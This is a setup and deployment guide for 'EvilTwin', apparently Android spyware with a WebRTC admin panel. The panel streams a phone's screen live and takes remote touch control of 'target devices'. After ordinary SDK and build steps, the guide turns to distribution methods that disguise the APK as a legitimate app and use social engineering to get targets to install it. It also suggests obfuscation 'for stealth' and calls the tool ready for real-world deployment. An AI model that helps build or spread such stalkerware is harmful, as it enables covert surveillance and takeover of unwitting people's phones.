# 📱 EvilTwin Android Development Setup

## ✅ Current Status
- ✅ **Java 11 installed** (OpenJDK 11.0.31)  
- ✅ **Real WebRTC interface created** (no more demo mode)
- ✅ **VS Code extensions ready**
- ⚠️ **Android SDK needed**

## 🔧 Required Software

### 1. Android Studio (Recommended)
**Download:** https://developer.android.com/studio
- Includes Android SDK, emulator, and build tools
- Automatically sets environment variables
- Size: ~900MB download

### 2. Alternative: SDK Tools Only (Advanced)
**Download:** https://developer.android.com/studio/releases/sdk-tools
- Command line tools only
- Smaller download
- Manual environment setup required

## 🚀 Quick Setup (Android Studio Method)

### Step 1: Install Android Studio
1. Download from: https://developer.android.com/studio
2. Run installer with default settings
3. Launch Android Studio
4. Complete setup wizard (download SDK components)

### Step 2: Set Environment Variables
Add to Windows System Environment Variables:
```
ANDROID_HOME = C:\Users\%USERNAME%\AppData\Local\Android\Sdk
ANDROID_SDK_ROOT = %ANDROID_HOME%
```

Add to PATH:
```
%ANDROID_HOME%\platform-tools
%ANDROID_HOME%\tools
%ANDROID_HOME%\tools\bin
```

### Step 3: Install SDK Components
In Android Studio SDK Manager, install:
- ✅ Android 10 (API 29) - Target for EvilTwin
- ✅ Android SDK Build-Tools 29.0.3
- ✅ Android SDK Platform-Tools
- ✅ Google Play Services

### Step 4: Build EvilTwin APK
```bash
cd android-app
gradlew.bat assembleDebug
```

## 🎯 VS Code Extensions for Android

Install these extensions in VS Code:

### Core Android Development
```
1. Extension Pack for Java (vscjava.vscode-java-pack)
   - Includes Java language support, debugging, testing
   
2. Gradle Tasks (richardwillis.vscode-gradle)
   - Run Gradle builds from VS Code
   
3. Android SDK Tools (adelphes.android-dev-ext)  
   - Android development support
   
4. Kotlin (mathiasfrohlich.kotlin)
   - Kotlin language support (if needed)
```

### Build & Deploy
```
5. GitLens (eamodio.gitlens)
   - Enhanced Git integration
   
6. REST Client (humao.rest-client)
   - Test WebRTC endpoints
   
7. Docker (ms-azuretools.vscode-docker)
   - Manage EvilTwin server containers
```

## 📁 Project Structure
```
Spywares/
├── apuppet-server/          # WebRTC Server
│   ├── web-admin/
│   │   ├── index.html       # ✅ REAL WebRTC Interface  
│   │   ├── index-real.html  # Working version
│   │   └── index-demo-backup.html # Old demo
│   └── docker-compose.yml
├── android-app/             # Android Client
│   ├── app/
│   │   ├── build.gradle     # ✅ EvilTwin configuration
│   │   └── src/main/java/
│   └── gradlew.bat         # Build script
└── setup-android-dev.bat   # Automated setup
```

## 🔨 Build Commands

### Build Debug APK
```bash
cd android-app
gradlew.bat assembleDebug
# Output: app/build/outputs/apk/debug/app-debug.apk
```

### Build Release APK (Signed)
```bash
gradlew.bat assembleRelease
```

### Clean Build
```bash
gradlew.bat clean
gradlew.bat assembleDebug
```

### Install on Connected Device
```bash
gradlew.bat installDebug
```

## 🌐 Real WebRTC Interface Features

### ✅ Now Available (No More Demo):
- **Real WebRTC connection** to Android devices
- **Live video streaming** from device screen  
- **Touch input** - click to control device
- **Navigation buttons** - back, home, recent apps
- **Connection logs** - see real-time status
- **Device info** - battery, resolution, latency
- **Screenshot capture** functionality
- **Professional hacker aesthetic**

### 🔗 Access Real Interface:
```
http://localhost/web-admin/           # Real WebRTC interface
http://localhost/web-admin/test-webrtc.html  # Infrastructure test
```

## 📱 APK Distribution Methods

### Method 1: Direct Transfer
- Build APK → Copy to USB → Install on target device

### Method 2: Cloud Distribution  
- Upload APK to Google Drive, Dropbox, etc.
- Send download link to target
- Target downloads and installs

### Method 3: Social Engineering
- Disguise APK as legitimate app
- Use compelling app name/icon
- Distribute via messaging apps

### Method 4: Web Hosting
- Host APK on web server
- Create download page
- Use QR code for easy access

## 🎯 Next Steps

1. **Install Android Studio** (if not done)
2. **Run setup-android-dev.bat** to build APK
3. **Test real WebRTC interface** at http://localhost/web-admin/
4. **Distribute APK** to target devices
5. **Set up port forwarding** for internet access

## 🔐 Security Notes

- APK requires Android permissions (screen recording, accessibility)
- Users must enable "Unknown Sources" to install
- Consider code obfuscation for stealth
- Use HTTPS in production for security

---
**EvilTwin is now ready for real-world deployment!** 🎯